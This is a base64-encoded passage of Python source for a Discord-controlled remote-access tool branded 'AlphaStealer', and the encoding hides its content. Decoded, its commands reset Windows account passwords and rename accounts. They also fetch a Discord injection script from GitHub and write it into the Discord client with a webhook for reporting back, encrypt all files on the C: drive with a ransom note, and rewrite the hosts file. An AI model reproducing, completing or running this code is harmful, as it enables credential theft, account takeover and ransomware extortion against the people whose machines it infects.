HduZCwgU1dfSElERSkNCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQoNCkBib3QuY29tbWFuZChuYW1lPSdzaG93dGFza2JhcicpDQphc3luYyBkZWYgc2hvd3Rhc2tiYXIoY3R4KToNCiAgICBpZiBub3QgaXNfYWRtaW4oKToNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoJ0kgZG8gbm90IGhhdmUgYWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzLicpDQogICAgICAgIHJldHVybg0KICAgIHRyeToNCiAgICAgICAgc2hvd190YXNrYmFyKCkNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nVGFzayBiYXIgaXMgbm93IHZpc2libGUuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZiJFcnJvcjoge2V9IikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2hpZGV0YXNrYmFyJykNCmFzeW5jIGRlZiBoaWRldGFza2JhcihjdHgpOg0KICAgIGlmIG5vdCBpc19hZG1pbigpOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgnSSBkbyBub3QgaGF2ZSBhZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMuJykNCiAgICAgICAgcmV0dXJuDQogICAgdHJ5Og0KICAgICAgICBoaWRlX3Rhc2tiYXIoKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUYXNrIGJhciBpcyBub3cgaGlkZGVuLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiRXJyb3I6IHtlfSIpDQoNCkBib3QuY29tbWFuZChuYW1lPSd1c2VybmFtZWZ1Y2tlcicpDQphc3luYyBkZWYgdXNlcm5hbWVmdWNrZXIoY3R4LCBvbGRfbmFtZTogc3RyLCBuZXdfbmFtZTogc3RyKToNCiAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgIGNtZCA9IGYnd21pYyB1c2VyYWNjb3VudCB3aGVyZSBuYW1lPSJ7b2xkX25hbWV9IiByZW5hbWUgIntuZXdfbmFtZX0iJw0KICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkNCiAgICAgICAgaWYgcmVzdWx0LnJldHVybmNvZGUgPT0gMDoNCiAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1VzZXJuYW1lIGNoYW5nZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIkVycm9yIGNoYW5naW5nIHVzZXJuYW1lOiB7cmVzdWx0LnN0ZGVycn0iKQ0KICAgIGVsc2U6DQogICAgICAgIHBhc3MNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3VzZXJwYXNzZnVja2VyJykNCmFzeW5jIGRlZiB1c2VycGFzc2Z1Y2tlcihjdHgsIHVzZXJuYW1lOiBzdHIsIG5ld19wYXNzd29yZDogc3RyKToNCiAgICBpZiBvcy5uYW1lID09ICdudCc6DQogICAgICAgIGNtZCA9IGYnbmV0IHVzZXIge3VzZXJuYW1lfSB7bmV3X3Bhc3N3b3JkfScNCiAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5ydW4oY21kLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpDQogICAgICAgIGlmIHJlc3VsdC5yZXR1cm5jb2RlID09IDA6DQogICAgICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdQYXNzd29yZCBjaGFuZ2VkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoZiJFcnJvciBjaGFuZ2luZyBwYXNzd29yZDoge3Jlc3VsdC5zdGRlcnJ9IikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2luamVjdCcpDQphc3luYyBkZWYgaW5qZWN0KGN0eCk6DQogICAgZ3VpbGQgPSBjdHguZ3VpbGQNCiAgICBjYXRlZ29yeSA9IGRpc2NvcmQudXRpbHMuZ2V0KGd1aWxkLmNhdGVnb3JpZXMsIG5hbWU9aG9zdG5hbWUpDQogICAgaWYgbm90IGNhdGVnb3J5Og0KICAgICAgICByZXR1cm4NCg0KICAgIGluamVjdGlvbnNfY2hhbm5lbCA9IGRpc2NvcmQudXRpbHMuZ2V0KGNhdGVnb3J5LnRleHRfY2hhbm5lbHMsIG5hbWU9ImluamVjdGlvbnMiKQ0KICAgIGlmIG5vdCBpbmplY3Rpb25zX2NoYW5uZWw6DQogICAgICAgIHJldHVybg0KDQogICAgd2ViaG9vayA9IGF3YWl0IGluamVjdGlvbnNfY2hhbm5lbC5jcmVhdGVfd2ViaG9vayhuYW1lPSJBbHBoYVN0ZWFsZXIgSW5qZWN0aW9ucyIpDQogICAgd2ViaG9va191cmwgPSB3ZWJob29rLnVybA0KDQogICAgaW5qZWN0aW9uX3VybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVW5rNjkzL2Rpc2NvcmQtaW5qZWN0aW9uL3JlZnMvaGVhZHMvbWFpbi9pbmRleC5qcycNCiAgICBmb2xkZXJfbGlzdCA9IFsnRGlzY29yZCcsICdEaXNjb3JkQ2FuYXJ5JywgJ0Rpc2NvcmRQVEInLCAnRGlzY29yZERldmVsb3BtZW50J10NCg0KICAgIGZvciBmb2xkZXIgaW4gZm9sZGVyX2xpc3Q6DQogICAgICAgIGJhc2VfcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpLCBmb2xkZXIpDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKGJhc2VfcGF0aCk6DQogICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgIGZvciBhcHBfZGlyIGluIG9zLmxpc3RkaXIoYmFzZV9wYXRoKToNCiAgICAgICAgICAgIGFwcF9wYXRoID0gb3MucGF0aC5qb2luKGJhc2VfcGF0aCwgYXBwX2RpcikNCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZGlyKGFwcF9wYXRoKSBvciAnYXBwLScgbm90IGluIGFwcF9kaXI6DQogICAgICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICAgICAgbW9kdWxlc19wYXRoID0gb3MucGF0aC5qb2luKGFwcF9wYXRoLCAnbW9kdWxlcycpDQogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2Rpcihtb2R1bGVzX3BhdGgpOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQoNCiAgICAgICAgICAgIGZvciBtb2R1bGVfbmFtZSBpbiBvcy5saXN0ZGlyKG1vZHVsZXNfcGF0aCk6DQogICAgICAgICAgICAgICAgaWYgbm90IG1vZHVsZV9uYW1lLnN0YXJ0c3dpdGgoJ2Rpc2NvcmRfZGVza3RvcF9jb3JlLScpOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgICAgICAgICAgY29yZV9wYXRoID0gb3MucGF0aC5qb2luKG1vZHVsZXNfcGF0aCwgbW9kdWxlX25hbWUsICdkaXNjb3JkX2Rlc2t0b3BfY29yZScpDQogICAgICAgICAgICAgICAgaW5kZXhfZmlsZSA9IG9zLnBhdGguam9pbihjb3JlX3BhdGgsICdpbmRleC5qcycpDQoNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhpbmRleF9maWxlKToNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoaW5qZWN0aW9uX3VybCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmplY3RlZF9jb250ZW50ID0gcmVzcG9uc2UudGV4dC5yZXBsYWNlKCIlV0VCSE9PS19VUkwlIiwgd2ViaG9va191cmwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5qZWN0ZWRfY29udGVudCA9IGluamVjdGVkX2NvbnRlbnQucmVwbGFjZSgnXG4nLCAnJykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihpbmRleF9maWxlLCAndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoaW5qZWN0ZWRfY29udGVudCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0Rpc2NvcmQgZmlsZXMgaW5mZWN0ZWQgc3VjY2Vzc2Z1bGx5LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgaW5qZWN0aW5nIGludG8ge2luZGV4X2ZpbGV9OiB7ZX0iKQ0KDQpkZWYgYnl0ZXNfdG9fZ2IoYnl0ZXNfc2l6ZSk6DQogICAgIiIiQ29udmllcnRlIGJ5dGVzIGEgR0IgY29uIGRvcyBkZWNpbWFsZXMuIiIiDQogICAgcmV0dXJuIHJvdW5kKGJ5dGVzX3NpemUgLyAoMTAyNCAqKiAzKSwgMikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2xpc3Rkcml2ZXMnKQ0KYXN5bmMgZGVmIGxpc3Rkcml2ZXMoY3R4KToNCiAgICAiIiJMaXN0YSBsb3MgZGlzY29zIGR1cm9zIGRlbCBzaXN0ZW1hIHVzYW5kbyB1biBFbWJlZCBib25pdG8uIiIiDQogICAgcGFydGl0aW9ucyA9IHBzdXRpbC5kaXNrX3BhcnRpdGlvbnMoKQ0KDQogICAgaWYgbm90IHBhcnRpdGlvbnM6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCLimqDvuI8gTm8gc2UgZW5jb250cmFyb24gZGlzY29zLiIpDQogICAgICAgIHJldHVybg0KDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKA0KICAgICAgICB0aXRsZT0iQ29tbWFuZCBTdWNjZXNzIiwNCiAgICAgICAgZGVzY3JpcHRpb249IkRpc2tzIEZvdW5kOiIsDQogICAgICAgIGNvbG9yPTB4RkYwMDAwDQogICAgKQ0KDQogICAgZm9yIHBhcnRpdGlvbiBpbiBwYXJ0aXRpb25zOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICB1c2FnZSA9IHBzdXRpbC5kaXNrX3VzYWdlKHBhcnRpdGlvbi5tb3VudHBvaW50KQ0KICAgICAgICAgICAgdG90YWxfZ2IgPSBieXRlc190b19nYih1c2FnZS50b3RhbCkNCiAgICAgICAgICAgIHVzZWRfZ2IgPSBieXRlc190b19nYih1c2FnZS51c2VkKQ0KICAgICAgICAgICAgZnJlZV9nYiA9IGJ5dGVzX3RvX2diKHVzYWdlLmZyZWUpDQoNCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZCgNCiAgICAgICAgICAgICAgICBuYW1lPWYi8J+SvSBEaXNrIiwNCiAgICAgICAgICAgICAgICB2YWx1ZT0oDQogICAgICAgICAgICAgICAgICAgIGYiKipOYW1lOioqIHtwYXJ0aXRpb24uZGV2aWNlfSAoYHtwYXJ0aXRpb24ubW91bnRwb2ludH1gKVxuIg0KICAgICAgICAgICAgICAgICAgICBmIioqVHlwZToqKiBge3BhcnRpdGlvbi5mc3R5cGV9YFxuIg0KICAgICAgICAgICAgICAgICAgICBmIioqVG90YWw6KiogYHt0b3RhbF9nYn0gR0JgXG4iDQogICAgICAgICAgICAgICAgICAgIGYiKipCdXN5OioqIGB7dXNlZF9nYn0gR0JgXG4iDQogICAgICAgICAgICAgICAgICAgIGYiKipGcmVlOioqIGB7ZnJlZV9nYn0gR0JgIiksIGlubGluZT1GYWxzZSkNCiAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoNCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPWYi8J+SvSB7cGFydGl0aW9uLmRldmljZX0gKHtwYXJ0aXRpb24uZnN0eXBlfSkiLCB2YWx1ZT0i4p2MIE5vIHNlIHB1ZG8gYWNjZWRlciBhbCB1c28gZGVsIGRpc2NvIChwZXJtaXNvIGRlbmVnYWRvKS4iLCBpbmxpbmU9RmFsc2UpDQoNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KZGVmIHByb2Nlc3NfZmlsZShmaWxlX3BhdGgsIGZlcm5ldCwgYWN0aW9uKToNCiAgICB0cnk6DQogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6DQogICAgICAgICAgICBmaWxlX2RhdGEgPSBmaWxlLnJlYWQoKQ0KICAgICAgICANCiAgICAgICAgaWYgYWN0aW9uID09ICdlbmNyeXB0JzoNCiAgICAgICAgICAgIHByb2Nlc3NlZF9kYXRhID0gZmVybmV0LmVuY3J5cHQoZmlsZV9kYXRhKQ0KICAgICAgICBlbGlmIGFjdGlvbiA9PSAnZGVjcnlwdCc6DQogICAgICAgICAgICBwcm9jZXNzZWRfZGF0YSA9IGZlcm5ldC5kZWNyeXB0KGZpbGVfZGF0YSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KICAgICAgICANCiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3diJykgYXMgZmlsZToNCiAgICAgICAgICAgIGZpbGUud3JpdGUocHJvY2Vzc2VkX2RhdGEpDQogICAgICAgIHJldHVybiBUcnVlDQogICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCmRlZiBlc19hcmNoaXZvX2NhbmRpZGF0byhmaWxlX3BhdGgpOg0KICAgIGlmIG9zLnBhdGguZ2V0c2l6ZShmaWxlX3BhdGgpIDwgMTAyNDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgcmV0dXJuIFRydWUNCg0KY2FycGV0YXNfZXhjbHVpZGFzID0gW10NCg0KZGVmIGVqZWN1dGFyX3JhbnNvbShhY3Rpb24sIGN0eCk6DQogICAgYXJjaGl2b3Nfb2sgPSAwDQogICAgYXJjaGl2b3NfZmFpbCA9IDANCiAgICANCiAgICBpZiBhY3Rpb24gPT0gJ2VuY3J5cHQnOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdSYW5zb213YXJlIFN0YXJ0ZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgICAgICBnZW5lcmFyX2tleSgpDQogICAgICAgIGtleSA9IGNhcmdhcl9rZXkoKQ0KICAgICAgICBmZXJuZXQgPSBGZXJuZXQoa2V5KQ0KICAgICAgICB3aXRoIG9wZW4oInJlYWRtZS50eHQiLCAidyIpIGFzIGZpbGU6DQogICAgICAgICAgICBmaWxlLndyaXRlKCJTeXN0ZW0gRW5jcnlwdGVkIEJ5IEFscGhhU3F1YWRcbiIpDQogICAgICAgICAgICBmaWxlLndyaXRlKCJHbyB0byBkaXNjb3JkLmdnLyBhbmQgb3BlbiBhIHRpY2tldC4iKQ0KICAgIGVsc2U6DQogICAgICAgIGtleSA9IGNhcmdhcl9rZXkoKQ0KICAgICAgICBmZXJuZXQgPSBGZXJuZXQoa2V5KQ0KDQogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoJ0M6XFwnLCB0b3Bkb3duPVRydWUpOg0KICAgICAgICBkaXJzWzpdID0gW2QgZm9yIGQgaW4gZGlycyBpZiBvcy5wYXRoLmpvaW4ocm9vdCwgZCkgbm90IGluIGNhcnBldGFzX2V4Y2x1aWRhc10NCg0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQ0KICAgICAgICAgICAgaWYgZXNfYXJjaGl2b19jYW5kaWRhdG8oZmlsZV9wYXRoKToNCiAgICAgICAgICAgICAgICBpZiBwcm9jZXNzX2ZpbGUoZmlsZV9wYXRoLCBmZXJuZXQsIGFjdGlvbik6DQogICAgICAgICAgICAgICAgICAgIGFyY2hpdm9zX29rICs9IDENCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBhcmNoaXZvc19mYWlsICs9IDENCg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1RoZSByYW5zb213YXJlIGlzIG92ZXInLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ncmFuc29tJykNCmFzeW5jIGRlZiByYW5zb20oY3R4LCBhY3Rpb246IHN0cik6DQogICAgaWYgYWN0aW9uIG5vdCBpbiBbJ2VuY3J5cHQnLCAnZGVjcnlwdCddOg0KICAgICAgICByZXR1cm4NCg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1dhaXQgZm9yIHRoZSByYW5zb213YXJlIHRvIGZpbmlzaCBpdHMgd29yay4nKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZWplY3V0YXJfcmFuc29tLCBhcmdzPShhY3Rpb24sIGN0eCksIGRhZW1vbj1UcnVlKQ0KICAgIHRocmVhZC5zdGFydCgpDQoNCmRlZiBTdGFydEFscGhhUHJlc2VuY2UoKToNCiAgICBjbGllbnRfaWQgPSAnMTM2NTk5MDAzMTkxMDUwNjQ5NicNCiAgICBycGMgPSBQcmVzZW5jZShjbGllbnRfaWQpDQogICAgcnBjLmNvbm5lY3QoKQ0KICAgIHJwYy51cGRhdGUoDQogICAgICAgIHN0YXRlPSdSZXRpcmVkIEJ5IEFscGhhU3F1YWQnLA0KICAgICAgICBkZXRhaWxzPSdQd25lZCBCeSBBbHBoYVN0ZWFsZXInLA0KICAgICAgICBzdGFydD10aW1lLnRpbWUoKQ0KICAgICkNCg0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRpbWUuc2xlZXAoNjApDQoNCkBib3QuY29tbWFuZChuYW1lPSdwcmVzZW5jZScpDQphc3luYyBkZWYgQWxwaGFQcmVzZW5jZShjdHgpOg0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVN0YXJ0QWxwaGFQcmVzZW5jZSwgZGFlbW9uPVRydWUpLnN0YXJ0KCkNCg0KSE9TVFNfUEFUSCA9IHIiQzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cyINClJFRElSRUNUX0lQID0gIjEyNy4wLjAuMSINCg0KZGVmIG5vcm1hbGl6ZV91cmwodXJsKToNCiAgICB1cmwgPSB1cmwubG93ZXIoKS5zdHJpcCgpDQogICAgdXJsID0gcmUuc3ViKHInXmh0dHBzPzovLyh3d3dcLik/JywgJycsIHVybCkNCiAgICB1cmwgPSB1cmwuc3BsaXQoJy8nKVswXQ0KICAgIHJldHVybiB1cmwNCg0KZGVmIGlzX2Jsb2NrZWQoZG9tYWluKToNCiAgICB0cnk6DQogICAgICAgIHdpdGggb3BlbihIT1NUU19QQVRILCAncicpIGFzIGZpbGU6DQogICAgICAgICAgICByZXR1cm4gYW55KGRvbWFpbiBpbiBsaW5lIGZvciBsaW5lIGluIGZpbGUpDQogICAgZXhjZXB0Og0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KZGVmIGJsb2NrX3dlYnNpdGUoZG9tYWluKToNCiAgICB3aXRoIG9wZW4oSE9TVFNfUEFUSCwgJ2EnKSBhcyBmaWxlOg0KICAgICAgICBmaWxlLndyaXRlKGYie1JFRElSRUNUX0lQfSB7ZG9tYWlufVxuIikNCiAgICAgICAgZmlsZS53cml0ZShmIntSRURJUkVDVF9JUH0gd3d3Lntkb21haW59XG4iKQ0KDQpkZWYgdW5ibG9ja193ZWJzaXRlKGRvbWFpbik6DQogICAgd2l0aCBvcGVuKEhPU1RTX1BBVEgsICdyJykgYXMgZmlsZToNCiAgICAgICAgbGluZXMgPSBmaWxlLnJlYWRsaW5lcygpDQogICAgd2l0aCBvcGVuKEhPU1RTX1BBVEgsICd3JykgYXMgZmlsZToNCiAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6DQogICAgICAgICAgICBpZiBkb21haW4gbm90IGluIGxpbmUgYW5kIGYid3d3Lntkb21haW59IiBub3QgaW4gbGluZToNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGxpbmUpDQoNCkBib3QuY29tbWFuZChuYW1lPSd3ZWItYmxvY2snKQ0KYXN5bmMgZGVmIHdlYl9ibG9jayhjdHgsIHVybDogc3RyKToNCiAgICBkb21haW4gPSBub3JtYWxpemVfdXJsKHVybCkNCiAgICBpZiBpc19ibG9ja2VkKGRvbWFpbik6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1dlYnNpdGUgQmxvY2tlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYmxvY2tfd2Vic2l0ZShkb21haW4pDQogICAgICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdXZWJzaXRlIEJsb2NrZWQuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgi4p2MIEVycm9yOiBBZG1pbmlzdHJhdG9yIFBlcm1pc3Npb25zLiIpDQoNCkBib3QuY29tbWFuZChuYW1lPSd3ZWItdW5sb2NrJykNCmFzeW5jIGRlZiB3ZWJfdW5sb2NrKGN0eCwgdXJsOiBzdHIpOg0KICAgIGRvbWFpbiA9IG5vcm1hbGl6ZV91cmwodXJsKQ0KICAgIGlmIG5vdCBpc19ibG9ja2VkKGRvbWFpbik6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1dlYnNpdGUgQmxvY2tlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgdW5ibG9ja193ZWJzaXRlKGRvbWFpbikNCiAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1dlYnNpdGUgQmxvY2tlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKCLinYwgRXJyb3I6IEFkbWluaXN0cmF0b3IgUGVybWlzc2lvbnMuIikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3dlYi1saXN0JykNCmFzeW5jIGRlZiB3ZWJfbGlzdChjdHgpOg0KICAgIHRyeToNCiAgICAgICAgd2l0aCBvcGVuKEhPU1RTX1BBVEgsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQ0KICAgICAgICBibG9ja2VkID0gW10NCiAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6DQogICAgICAgICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoUkVESVJFQ1RfSVApOg0KICAgICAgICAgICAgICAgIHBhcnRzID0gbGluZS5zcGxpdCgpDQogICAgICAgICAgICAgICAgaWYgbGVuKHBhcnRzKSA+IDE6DQogICAgICAgICAgICAgICAgICAgIGRvbWFpbiA9IHBhcnRzWzFdDQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBkb21haW4uc3RhcnRzd2l0aCgibG9jYWxob3N0Iik6DQogICAgICAgICAgICAgICAgICAgICAgICBibG9ja2VkLmFwcGVuZChkb21haW4pDQogICAgICAgIGlmIG5vdCBibG9ja2VkOg0KICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoIuKdjCBObyBoYXkgc2l0b3MgYmxvcXVlYWRvcy4iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ2BgYHtibG9ja2VkfWBgYCcsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCLinYwgRXJyb3I6IEFkbWluaXN0cmF0b3IgUGVybWlzc2lvbnMuIikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3B3ZCcpDQphc3luYyBkZWYgcHdkKGN0eCk6DQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ2BgYHtvcy5nZXRjd2QoKX1gYGAnLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBB